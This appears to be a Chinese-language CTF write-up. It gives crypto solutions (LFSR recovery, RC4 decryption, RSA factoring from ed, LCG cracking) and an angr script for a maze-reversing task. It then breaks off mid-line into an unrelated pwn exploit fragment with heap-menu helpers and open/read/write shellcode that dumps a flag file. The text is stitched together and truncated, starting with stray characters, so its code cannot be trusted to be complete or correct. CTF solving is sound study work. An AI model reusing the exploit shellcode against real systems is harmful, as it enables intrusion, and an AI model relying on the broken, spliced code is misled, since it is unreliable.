    @
    ==================================================
    d
    ==================================================
    Y
    [
    \
    ]
    ^
    y
    {
    |
    }
    ==================================================
    '''
    #flag="flag{it_1s_P@dd1n_@nd_p@d}"
###  random1
首先解一个lfsr，输出足够多，给了mask，解一个线性方程即可
然后拿着key解密密文就好。
    '''
    #sage
    b = open("change2", 'rb').read().decode()[:4]
    b_l = []
    for i in b:
        for j in bin(ord(i))[2:].rjust(8,"0"):
            b_l.append(j)
    output = vector(GF(2),b_l)
    A = []
    mask = "10100100000010000000100010010001"
    for i in range(32):
        B = []
        for j in range(32):
            if j == 31:
                B.append(mask[i])
            elif j == i-1:
                B.append(1)
            else:
                B.append(0)
        A.append(B)
    M = matrix(GF(2),A)
    M =M^32
    key = ""
    for i in M.solve_left(output):
        key+=str(i)
    print(hex(int(key,2)))
    '''
    #python2
    def key_padding(key):
        k = [0] * 256
        for i in range(256):
            k[i] = key[(i) % len(key)]
        return k
    def s_box_a():
        s = []
        for i in range(256):
            s.append(i)
        return s
    def s_box(s, key):
        j = 0
        for i in range(256):
            j = (j + s[i] + ord(key[i])) % 256
            s[j], s[i] = s[i], s[j]
        return s
    messages = 'WCbeI/BfRYydhk43yF1MIdOk4zPV'.decode('base64')
    def main():
        key1='0x1afea246'
        key=[]
        for i in range(len(key1)):
            key.append(key1[i])
        key=key_padding(key)
        sbox=s_box(s_box_a(),key)
        i=j=0
        c=""
        for x in range(len(messages)):
            i = (i+1)%256
            j = (j+sbox[i])%256
            sbox[i],sbox[j]=sbox[j],sbox[i]
            t=(sbox[i]+sbox[j])%128
            c+=chr(ord(messages[x])^sbox[t])
        print c
    main()
###  random
首先得到ed，n，拿来分解p，q
不知道e，根据 e * inverse(e,phi) == ed 爆一下，最后通过的是65553
然后给了这么多组LCG生成的伪随机数，经典LCG恢复参数，
    import random
    from gmpy2 import gcd
    from Crypto.Util.number import *
    def factor_n_with_ed(n,ed):  
        p = 1  
        q = 1  
        while p==1 and q==1:  
            k = ed - 1  
            g = random.randint(0,n)  
            while p==1 and q==1 and k % 2 == 0:  
                k /= 2  
                y = pow(g,k,n)  
                if y!=1 and gcd(y-1,n)>1:  
                    p = gcd(y-1,n)  
                    q = n/p  
        return p,q
    n1=3563329754048976946603729466426236052000141166700839903323255268203185709020494450173369806214666850943076188175778667508946270492708397447950521732324059148390232744011000065982865974194986726739638097566303135573072114448615095262066554751858952042395375417151593676621825939069783767865138657768553767717034970
    n2=3563121718917234588723786463275555826875232380691165919033718924958406353810813480184744219046717838078497090403751007254545187720107602959381881715875898243474504999760208133192572812110967142474619366650504948619637909653723376917174456091396220576841259798792078769198369072982063716206690589554604992470787752
    n = (n1-n2)/2
    ed = n1-n
    p,q = factor_n_with_ed(n,ed)
    phi = (p-1) * (q-1)
    for e in range(1,66666):
        if ed % e == 0:
            if e * inverse(e,phi) == ed:
                print(e)
    e = 65553        
    d = inverse(e,phi)
    m = bytes_to_long('you_can_get_more_message')
    print(pow(m,d,q))
    ####################
    pri = [3732074616716238200873760199583586585380050413464247806581164994328669362805685831589304096519259751316788496505512L, 8890204100026432347745955525310288219105398478787537287650267015873395979318988753693294398552098138526129849364748L, 3443072315415198209807083608377973177101709911155814986883368551162572889369288798755476092593196361644768257296318L, 4505278089908633319897964655164810526240982406502790229247008099600376661475710376587203809096899113787029887577355L, 9059646273291099175955371969413555591934318289156802314967132195752692549263532407952697867959054045527470269661073L, 3085024063381648326788677294168591675423302286026271441848856369032582049512915465082428729187341510738008226870900L, 8296028984288559154928442622341616376293205834716507766500770482261973424044111061163369828951815135486853862929166L, 2258750259954363171426415561145579135511127336142626306021868972064434742092392644953647611210700787749996466767026L, 4382123130034944542655156575000710851078842295367353943199512878514639434770161602326115915913531417058547954936492L, 10982933598223427852005472748543379913601896398647811680964579161339128908976511173382896549104296031483243900943925L]
    from Crypto.Util.number import *
    def gcd(a, b):
        while b:
            a, b = b, a%b
        return a
    def crack_unknown_increment(states, modulus, multiplier):
        increment = (states[1] - states[0]*multiplier) % modulus
        return modulus, multiplier, increment
    def crack_unknown_multiplier(states, modulus):
        multiplier = (states[2] - states[1]) * inverse(states[1] - states[0], modulus) % modulus
        return crack_unknown_increment(states, modulus, multiplier)
    def crack_unknown_modulus(states):
        diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
        zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
        modulus = abs(reduce(gcd, zeroes))
        return crack_unknown_multiplier(states, modulus)
    def lcg(seed,params):
        (m,c,n)=params
        x = seed % n
        yield int(x)
        while True:
            x = (m * x + c) % n
            yield int(x)
    (n,m,c)=crack_unknown_modulus([int(each) for each in pri])
    flag = long_to_bytes(((pri[0]-c) * inverse(m,n))%n)
    print flag
## Reverse
###  maze100
angr跑100层。手动patch点东西就行
    import angr
    import claripy
    right_list=[8782, 15581, 22350, 29053, 35792, 42537, 49240, 56189, 62880, 69667, 76244, 82971, 89758, 96521, 103302, 110173, 116984, 123819, 130648, 137603, 144414, 151225, 158102, 164847, 171556, 178343, 185070, 191911, 198746, 205563, 212356, 219161, 225942, 232747, 239516, 246321, 253102, 259901, 266676, 273481, 280298, 287037, 293842, 300605, 307596, 314335, 321092, 327879, 334684, 341609, 348372, 355219, 362108, 368823, 375628, 382373, 389238, 396007, 402716, 409461, 416194, 423065, 429936, 436753, 443618, 450567, 457372, 464141, 471012, 477781, 484652, 491553, 498460, 505301, 512142, 519043, 525770, 532425, 539326, 546185, 552984, 559813, 566660, 573375, 580150, 587015, 593874, 600679, 607604, 614451, 621220, 628079, 634752, 641563, 648482, 655287, 662116, 669017, 675960, 682663]
    avoid_list=[[8538, 8719], [15337, 15518], [22106, 22287], [28809, 28990], [35548, 35729], [42293, 42474], [48996, 49177], [55945, 56126], [62636, 62817], [69423, 69604], [76000, 76181], [82727, 82908], [89514, 89695], [96277, 96458], [103058, 103239], [109929, 110110], [116740, 116921], [123575, 123756], [130404, 130585], [137359, 137540], [144170, 144351], [150981, 151162], [157858, 158039], [164603, 164784], [171312, 171493], [178099, 178280], [184826, 185007], [191667, 191848], [198502, 198683], [205319, 205500], [212112, 212293], [218917, 219098], [225698, 225879], [232503, 232684], [239272, 239453], [246077, 246258], [252858, 253039], [259657, 259838], [266432, 266613], [273237, 273418], [280054, 280235], [286793, 286974], [293598, 293779], [300361, 300542], [307352, 307533], [314091, 314272], [320848, 321029], [327635, 327816], [334440, 334621], [341365, 341546], [348128, 348309], [354975, 355156], [361864, 362045], [368579, 368760], [375384, 375565], [382129, 382310], [388994, 389175], [395763, 395944], [402472, 402653], [409217, 409398], [415950, 416131], [422821, 423002], [429692, 429873], [436509, 436690], [443374, 443555], [450323, 450504], [457128, 457309], [463897, 464078], [470768, 470949], [477537, 477718], [484408, 484589], [491309, 491490], [498216, 498397], [505057, 505238], [511898, 512079], [518799, 518980], [525526, 525707], [532181, 532362], [539082, 539263], [545941, 546122], [552740, 552921], [559569, 559750], [566416, 566597], [573131, 573312], [579906, 580087], [586771, 586952], [593630, 593811], [600435, 600616], [607360, 607541], [614207, 614388], [620976, 621157], [627835, 628016], [634508, 634689], [641319, 641500], [648238, 648419], [655043, 655224], [661872, 662053], [668773, 668954], [675716, 675897], [682419, 682600]]
    func_list=[1930, 8783, 15582, 22351, 29054, 35793, 42538, 49241, 56190, 62881, 69668, 76245, 82972, 89759, 96522, 103303, 110174, 116985, 123820, 130649, 137604, 144415, 151226, 158103, 164848, 171557, 178344, 185071, 191912, 198747, 205564, 212357, 219162, 225943, 232748, 239517, 246322, 253103, 259902, 266677, 273482, 280299, 287038, 293843, 300606, 307597, 314336, 321093, 327880, 334685, 341610, 348373, 355220, 362109, 368824, 375629, 382374, 389239, 396008, 402717, 409462, 416195, 423066, 429937, 436754, 443619, 450568, 457373, 464142, 471013, 477782, 484653, 491554, 498461, 505302, 512143, 519044, 525771, 532426, 539327, 546186, 552985, 559814, 566661, 573376, 580151, 587016, 593875, 600680, 607605, 614452, 621221, 628080, 634753, 641564, 648483, 655288, 662117, 669018, 675961]
    proj=angr.Project('./100mazes',load_options={'auto_load_libs':False})
    md5_raw=b''
    for i in range(100):
        base=proj.loader.min_addr
        func=func_list[i]+base
        path=claripy.BVS('path',15*8)
        state=proj.factory.blank_state(addr=func,stdin=angr.SimFileStream(name='stdin',content=path,has_end=False))
        for j in range(8):
            state.solver.add(path.get_byte(j)>=32)
            state.solver.add(path.get_byte(j)> ','1')
        sh.sendlineafter('>> ',str(index))
        sh.sendlineafter('>> ',str(size))
    def edit(index,content):
        sh.sendlineafter('>> ','2')
        sh.sendlineafter('>> ',str(index))
        if(content):
            sh.sendafter('>> ',content)
    def free(index):
        sh.sendlineafter('>> ','3')
        sh.sendlineafter('>> ',str(index))
    shellcode = asm('''
        sub rsp, 0x800
        push 0x67616c66
        mov rdi, rsp
        xor esi, esi
        mov eax, 2
        syscall
        cmp eax, 0
        js failed
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax
        syscall
        mov edx, eax
        mov rsi, rsp
        mov edi, 1
        mov eax, edi
        syscall
        jmp exit
        failed:
        push 0x6c696166
        mov edi, 1
        mov rsi, rsp